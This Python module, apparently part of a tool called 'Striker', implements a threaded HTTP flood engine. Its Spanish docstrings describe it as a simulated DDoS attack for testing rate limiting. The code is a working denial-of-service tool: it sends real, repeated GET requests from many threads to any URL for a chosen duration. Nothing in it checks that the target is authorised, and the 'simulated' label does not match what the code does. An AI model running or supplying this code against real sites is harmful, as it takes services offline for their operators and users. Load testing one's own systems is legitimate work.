"""scanner/ddos.py — Motor de ataque DDoS simulado (para testing).

Usa threading + requests para simular tráfico masivo.
Ideal para probar rate limiting y monitoreo.
"""

import time
import threading
import requests
from collections import deque


class DDoSEngine:
    def __init__(self):
        self.running = False
        self.threads_list = []
        self.stats = {
            "requests": 0,
            "errors": 0,
            "bytes_sent": 0,
            "start_time": 0,
            "target": "",
        }
        self.lock = threading.Lock()
        self._stop_event = threading.Event()

    def start(self, url, threads=10, connections=50, duration=10):
        """
        Inicia un ataque DDoS simulado.

        Args:
            url: URL del endpoint a atacar
            threads: número de hilos concurrentes
            connections: requests por hilo
            duration: duración máxima en segundos
        """
        if self.running:
            return {"error": "DDoS already running"}

        self.running = True
        self._stop_event.clear()
        self.stats = {
            "requests": 0,
            "errors": 0,
            "bytes_sent": 0,
            "start_time": time.time(),
            "target": url,
        }
        self.threads_list = []

        def worker(wid):
            session = requests.Session()
            session.headers.update({"User-Agent": f"Striker-DDoS/{wid}"})
            end_time = time.time() + duration

            while time.time() < end_time and not self._stop_event.is_set():
                try:
                    resp = session.get(url, timeout=3, allow_redirects=False)
                    with self.lock:
                        self.stats["requests"] += 1
                        self.stats["bytes_sent"] += len(resp.content)
                except Exception:
                    with self.lock:
                        self.stats["errors"] += 1

        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,), daemon=True)
            t.start()
            self.threads_list.append(t)

        # Auto-stop timer
        def auto_stop():
            time.sleep(duration + 1)
            self.stop()

        threading.Thread(target=auto_stop, daemon=True).start()

        return {"status": "started", "threads": threads, "duration": duration}

    def stop(self):
        """Detiene el ataque DDoS."""
        self._stop_event.set()
        self.running = False

    def get_stats(self):
        """Retorna estadísticas actuales."""
        with self.lock:
            elapsed = time.time() - self.stats["start_time"]
            rps = self.stats["requests"] / elapsed if elapsed > 0 else 0
            return {
                "running": self.running,
                "target": self.stats["target"],
                "total_requests": self.stats["requests"],
                "errors": self.stats["errors"],
                "rps": round(rps, 1),
                "elapsed": round(elapsed, 1),
            }


# Instancia global
ddos_engine = DDoSEngine()
